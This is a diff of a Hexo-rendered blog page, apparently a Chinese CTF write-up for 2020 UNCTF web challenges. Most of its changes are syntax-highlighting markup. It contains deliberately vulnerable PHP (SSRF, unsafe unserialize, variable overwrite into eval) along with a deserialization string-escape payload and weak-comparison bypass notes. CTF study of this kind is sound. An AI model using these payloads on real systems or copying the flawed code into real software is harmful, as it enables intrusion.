@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -251,11 +251,11 @@
 
 <h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
-<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/unctf\.com/&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
-    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
-        <span class="hljs-variable">$url</span>=file_get_contents(<span class="hljs-variable">$url</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/unctf\.com/&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
+    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
+        <span class="hljs-variable">$url</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);
         <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$url</span>);
     &#125;<span class="hljs-keyword">else</span>&#123;
         <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);
@@ -278,16 +278,16 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <p>先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
-    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
 &#125;
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
 &#125;
-<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
-<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
+<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));
 
-<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
@@ -301,7 +301,7 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre></div>
 
 <p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
-<p><img src="/2020/11/17/UNCTF/C:%5CUsers%5CSunzh%5CDesktop%5CCtefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
+<p><img src="/2020/11/17/UNCTF/Users\Sunzh\Desktop\Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
 <p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
 <p>例如想将pass变量的序列化字符串如下</p>
 <div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre></div>
@@ -310,17 +310,17 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
-    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
 &#125;
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
 &#125;
-<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
-var_dump(serialize(<span class="hljs-variable">$AA</span>));
-<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
-var_dump(<span class="hljs-variable">$res</span>);
-<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));
+<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);
+<span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
 <span class="hljs-comment">//echo unserialize($AA);</span>
 <span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span>
@@ -337,8 +337,8 @@ var_dump(<span class="hljs-variable">$res</span>);
 <p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html">参考</a></p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
 <span class="hljs-class"></span>&#123;
@@ -346,12 +346,12 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
     <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span>
 <span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
-        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
+        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
     &#125;
     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
 <span class="hljs-function">    </span>&#123;
-            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
             &#123;
                 <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
                 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    
@@ -364,13 +364,13 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
     &#125;
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
-    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
 &#125;
 
 <span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];
 <span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;
-<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
-<span class="hljs-variable">$test</span>=unserialize(<span class="hljs-variable">$ser</span>);
+<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>这段代码的意思大致为，get方式提交一个1作为uname，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
@@ -389,79 +389,79 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 &#125;
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
-    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
 &#125;
-<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
 <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 
 
-<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;
+<div class="hljs"><pre><code class="hljs css">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;
 
-<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>
+//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为<span class="hljs-number">156</span></code></pre></div>
 
 <p>finalpayload：</p>
 <div class="hljs"><pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre></div>
 
-<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  /source查看源码</p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  &#x2F;source查看源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-variable">$adminPassword</span> = <span class="hljs-string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;
-<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;fuxkSQL&#x27;</span>)) &#123;
+<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;fuxkSQL&#x27;</span>)) &#123;
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span>(<span class="hljs-params"><span class="hljs-variable">$iText</span></span>)    </span>
 <span class="hljs-function">    </span>&#123;
         <span class="hljs-variable">$oText</span> = <span class="hljs-variable">$iText</span>;
-        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-variable">$oText</span>);
-        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$oText</span>);
-        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
-        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
         <span class="hljs-keyword">return</span> <span class="hljs-variable">$oText</span>;
     &#125;
 &#125;
-<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;getVars&#x27;</span>)) &#123;
+<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getVars&#x27;</span>)) &#123;
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span>(<span class="hljs-params"></span>)</span>
 <span class="hljs-function">    </span>&#123;
-        <span class="hljs-variable">$totals</span> = array_merge(<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>);
-        <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$_GET</span>)) &#123;
+        <span class="hljs-variable">$totals</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$_GET</span>)) &#123;
             <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
                 <span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$key</span>&#125;;
-                <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$value</span>)) &#123;
+                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>)) &#123;
                     <span class="hljs-variable">$temp_array</span> = <span class="hljs-keyword">array</span>();
                     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key2</span> =&gt; <span class="hljs-variable">$value2</span>) &#123;
-                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
-                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = fuxkSQL(trim(<span class="hljs-variable">$value2</span>));
+                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
+                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = <span class="hljs-title function_ invoke__">fuxkSQL</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value2</span>));
                         &#125; <span class="hljs-keyword">else</span> &#123;
-                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (trim(<span class="hljs-variable">$value2</span>))));
+                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value2</span>))));
                         &#125;
                     &#125;
                     $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$temp_array</span>;
                 &#125; <span class="hljs-keyword">else</span> &#123;
-                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
-                        $&#123;<span class="hljs-variable">$key</span>&#125; = fuxkSQL(trim(<span class="hljs-variable">$value</span>));
+                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
+                        $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-title function_ invoke__">fuxkSQL</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
                     &#125; <span class="hljs-keyword">else</span> &#123;
-                        $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (trim(<span class="hljs-variable">$value</span>))));
+                        $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>))));
                     &#125;
                 &#125;
             &#125;
         &#125;
     &#125;
 &#125;
-getVars();
+<span class="hljs-title function_ invoke__">getVars</span>();
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$source</span>)) &#123;
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 &#125;
 <span class="hljs-comment">//只有admin才能设置环境变量</span>
-<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$password</span>) === <span class="hljs-variable">$adminPassword</span> &amp;&amp; sha1(<span class="hljs-variable">$verif</span>) == <span class="hljs-variable">$verif</span>) &#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>) === <span class="hljs-variable">$adminPassword</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$verif</span>) == <span class="hljs-variable">$verif</span>) &#123;
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can set config variables!!&#x27;</span> . <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;
-    <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
-        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; strlen(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
             @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$<span class="hljs-subst">$key</span>&quot;</span> . <span class="hljs-string">&#x27;=&quot;&#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);
         &#125;
     &#125;
 &#125; <span class="hljs-keyword">else</span> &#123;
-    <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
-        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>)) &#123;
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>)) &#123;
             <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) . <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;
         &#125;
     &#125;
@@ -471,32 +471,32 @@ getVars();
 <p>fuxkSQL是将可能存在sql注入的符号转义</p>
 <p>getvarh是将传的参数赋值</p>
 <p>global ${$key};这里存在两个$$，所以可能存在变量覆盖</p>
-<p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p>
+<p>if (md5($password) &#x3D;&#x3D;&#x3D; $adminPassword &amp;&amp; sha1($verif) &#x3D;&#x3D; $verif) </p>
 <p>$password的md5值与adminPassword,这里可以利用变量覆盖绕过</p>
-<p>password=111&amp;adminPassword=md(111)</p>
-<p>sha1($verif)==$verif弱类型比较，也很容易绕过</p>
-<p>sha1($a)=0exxx</p>
+<p>password&#x3D;111&amp;adminPassword&#x3D;md(111)</p>
+<p>sha1($verif)&#x3D;&#x3D;$verif弱类型比较，也很容易绕过</p>
+<p>sha1($a)&#x3D;0exxx</p>
 <p>只要找出0e开头的字符串的sha1值为0e开头</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i5</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i5</span> &lt;= <span class="hljs-number">9999999999</span>; <span class="hljs-variable">$i5</span>++) &#123;
     <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;0e&#x27;</span> . <span class="hljs-variable">$i5</span>;
     <span class="hljs-comment">//0e1290633704</span>
